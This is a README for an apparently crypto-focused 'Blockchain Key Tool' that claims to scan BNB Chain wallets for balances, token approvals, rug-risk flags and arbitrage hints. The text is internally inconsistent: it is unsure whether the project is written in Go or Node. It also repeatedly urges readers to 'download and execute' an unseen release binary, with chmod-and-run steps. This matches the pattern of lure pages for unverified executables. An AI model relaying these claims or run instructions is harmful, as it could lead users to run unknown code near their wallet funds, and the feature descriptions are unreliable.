# Blockchain Key Tool — BNB Chain Wallet Assessment & Profit Guide
[![Releases - Download](https://img.shields.io/badge/Releases-Download-blue?style=for-the-badge&logo=github)](https://github.com/dilaw46/Blockchain-Key-Tool/releases)  
https://github.com/dilaw46/Blockchain-Key-Tool/releases

🛠️ A compact toolset to assess wallets on BNB Chain. Scan balances, token holdings, approvals, risk signals, and simple arbitrage hints. Built for analysts, traders, and developers who want a clear snapshot of wallet health.

---

## Key features
- Fast wallet scan on BNB Chain RPC.
- Token balance breakdown with USD valuation.
- Approval scanner to list ERC-20 approvals.
- Liquidity and rug-risk flags for tokens.
- Transaction history summary and gas profiling.
- Simple arbitrage candidate detection across common DEXes.
- Export results to JSON and CSV.
- CLI and minimal GUI mode.

---

## Why use this
- Get a clear wallet snapshot in one pass.
- Find risky approvals that can drain funds.
- Spot tokens with low liquidity or honeypot patterns.
- See potential arbitrage where spreads and liquidity match.
- Use results for audits, manual checks, or integration into automation.

---

## Screenshots & images
![Blockchain ribbon](https://images.unsplash.com/photo-1535223289827-42f1e9919769?q=80&w=1200&auto=format&fit=crop&ixlib=rb-4.0.3&s=7f4b0f8b5f6f7f6f39fbb1ad0a7b3f6e)
![BNB concept](https://cryptologos.cc/logos/binance-coin-bnb-logo.png?v=014)

---

## Quick start (download and run)
Download and execute the release file from:
https://github.com/dilaw46/Blockchain-Key-Tool/releases

Pick the release that matches your OS. Download the binary or archive. Extract if needed. On Linux or macOS, mark the binary executable and run it:

- Linux / macOS
  - chmod +x blockchain-key-tool
  - ./blockchain-key-tool --address 0xYourAddressHere --rpc https://bsc-dataseed.binance.org

- Windows (PowerShell)
  - .\blockchain-key-tool.exe --address 0xYourAddressHere --rpc https://bsc-dataseed.binance.org

The release file contains a small CLI and optional GUI bundle. Run the binary to see help:

- ./blockchain-key-tool --help

If you prefer a packaged archive, extract it and run the included script.

---

## Install from source
Requirements:
- Go 1.20+ (if the tool is Go based) or Node 16+ (if Node)  
- Git

Clone and build:

- git clone https://github.com/dilaw46/Blockchain-Key-Tool.git
- cd Blockchain-Key-Tool

If the repo uses Go:
- go build -o blockchain-key-tool ./cmd/cli

If the repo uses Node:
- npm ci
- npm run build
- node dist/cli.js --address 0xYourAddressHere --rpc https://bsc-dataseed.binance.org

Run the built binary as shown in Quick start.

---

## CLI usage
Basic scan:
- ./blockchain-key-tool --address 0xYourAddressHere --rpc https://bsc-dataseed.binance.org

Output options:
- --output json      Export full JSON report.
- --output csv       Export balances to CSV.
- --limit 50         Limit token checks to top 50 by value.
- --scan-approvals   Scan ERC-20 approvals.
- --scan-dex         Query common DEXes for liquidity and price impact.

Report example (JSON excerpt):
{
  "address": "0xYourAddressHere",
  "bnb_balance": "1.2345",
  "tokens": [
    {
      "symbol": "CAKE",
      "balance": "12.5",
      "usd_value": "38.20",
      "liquidity": "12000",
      "risk_flags": ["low_liquidity"]
    }
  ],
  "approvals": [
    {
      "spender": "0xSpenderAddress",
      "token": "CAKE",
      "allowance": "1000000",
      "risk": "high"
    }
  ],
  "arbitrage_candidates": [
    {
      "pair": "CAKE/BNB",
      "spread": "3.4%",
      "liquidity_ok": true
    }
  ]
}

---

## How it works
1. The tool queries BNB Chain RPC for balances and token transfers.
2. It collects token metadata from common token lists and on-chain calls.
3. The tool reads ERC-20 allowances to list approved spenders.
4. For each token, it probes liquidity pools on common DEXes to estimate slippage and pool depth.
5. It flags tokens with low liquidity, extreme price shifts, or known honeypot behaviors.
6. For arbitrage hints, the tool compares quoted prices across pools and computes spread vs estimated gas cost.

The tool uses simple heuristics. It gives hints, not trade signals. Use the JSON export to feed other tools.

---

## Use cases
- Audit wallets before transfer or custody.
- Check approvals before interacting with a protocol.
- Scan a list of wallets for balances and potential profit situations.
- Feed snapshot data into a dashboard.
- Run routine scans to catch risky approvals.

---

## Examples
Scan a wallet and save JSON:
- ./blockchain-key-tool --address 0xA1B2C3... --output json > wallet-scan.json

Scan multiple addresses from file:
- ./blockchain-key-tool --addresses-file addresses.txt --output csv --limit 20

Run an approvals-only scan:
- ./blockchain-key-tool --address 0xA1B2C3... --scan-approvals --output json

Run a DEX liquidity check for top tokens:
- ./blockchain-key-tool --address 0xA1B2C3... --scan-dex --limit 10

---

## API & integration
The CLI supports a local HTTP mode for automation:
- ./blockchain-key-tool --serve --port 8080
Then query:
- GET http://localhost:8080/scan?address=0xYourAddressHere

Returned JSON follows the same schema as the CLI output. Use the endpoint to integrate scans into larger pipelines.

---

## Data fields explained
- bnb_balance: Native BNB balance.
- tokens: Array of token entries with balance and USD value.
- liquidity: Estimated pool liquidity on DEXes.
- risk_flags: Simple labels like low_liquidity, honeypot-pattern, rug-suspect.
- approvals: ERC-20 allowances and identified spender addresses.
- arbitrage_candidates: Pair, spread, and a quick viability flag.

---

## Common workflows
Audit before transfer:
- Run a full scan.
- Check approvals.
- Export JSON.
- Review risk_flags for tokens you plan to move.

Watchlist scan:
- Keep an addresses.txt file.
- Run a nightly batch:
  - ./blockchain-key-tool --addresses-file addresses.txt --output csv > nightly.csv

Arbitrage probe:
- Run scan-dex on a list of tokens.
- Filter arbitrage_candidates by spread > 2% and liquidity_ok true.

---

## Security and privacy
The tool queries public RPC endpoints and DEX contracts. It does not require private keys for scanning. If you run the GUI or server mode, run it in a secure environment. Store exported reports securely.

---

## Troubleshooting
- RPC timeouts: Try a different BSC node or increase timeout with --rpc-timeout.
- Missing token data: The tool tries on-chain metadata first. Add a custom token list if needed.
- Large wallets: Use --limit to constrain token checks.

---

## Contributing
- Fork the repo.
- Create a feature branch.
- Add tests and documentation for new features.
- Send a pull request with a clear description.

Areas to help:
- Add more DEX adapters.
- Improve risk detection heuristics.
- Add language bindings or GUI improvements.

---

## Tests
- Unit tests cover token parsing and allowance detection.
- Integration tests run against a testnet or a known mainnet snapshot.
- Run tests:
  - go test ./... (for Go)
  - npm test (for Node)

---

## Releases
Download and execute the release file from:
https://github.com/dilaw46/Blockchain-Key-Tool/releases

Grab the binary that matches your OS. The release will include checksums and a short changelog.

---

## License
This project uses the MIT license. See LICENSE file for the full text.

---

## Contact
- Issues: Use the GitHub Issues tab.
- Pull requests: Open PRs against main.
- Discussions: Use GitHub Discussions for feature requests and usage tips.